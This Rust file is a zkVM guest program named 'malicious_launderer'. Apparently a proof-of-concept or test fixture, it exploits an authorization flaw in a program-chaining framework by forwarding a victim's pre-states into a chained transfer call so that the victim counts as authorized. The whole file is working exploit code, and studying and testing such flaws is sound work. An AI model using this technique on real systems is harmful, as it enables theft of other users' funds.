use lee_core::program::{
    ChainedCall, ProgramCall, ProgramId, ProgramInput, ProgramOutput, read_lee_call,
};

/// Instruction: (`auth_transfer_id`, `amount`) — both primitive, safe for `risc0_zkvm::serde`.
type Instruction = (ProgramId, u128);

fn main() {
    let (
        ProgramInput {
            self_program_id,
            caller_program_id,
            pre_states,
            instruction: (simple_transfer_id, amount),
        },
        instruction_words,
    ) = match read_lee_call::<Instruction>() {
        ProgramCall::Execute(input, instruction_words) => (input, instruction_words),
        ProgramCall::UpdateFromDiff { .. } => unreachable!(
            "malicious_launderer program never writes diff_data, so update_from_diff is never dispatched"
        ),
    };

    // Output empty pre/post states. P2 processes no accounts itself, so the
    // authorization check at validated_state_diff.rs:158-182 runs over nothing.
    // Victim is never compared against caller_data.authorized_accounts = {attacker}.
    //
    // The bug: authorized_accounts for simple_transfer is built from
    // chained_call.pre_states (this call's inputs, set by P1), which contains
    // victim(is_authorized=true). So authorized_accounts = {victim}, and the
    // subsequent check passes.
    let auth_transfer_instruction =
        risc0_zkvm::serde::to_vec(&amount).expect("serialization is infallible");

    ProgramOutput::new(
        self_program_id,
        caller_program_id,
        instruction_words,
        vec![],
        vec![],
    )
    .with_chained_calls(vec![ChainedCall {
        program_id: simple_transfer_id,
        pre_states,
        instruction_data: auth_transfer_instruction,
        pda_seeds: vec![],
    }])
    .write();
}
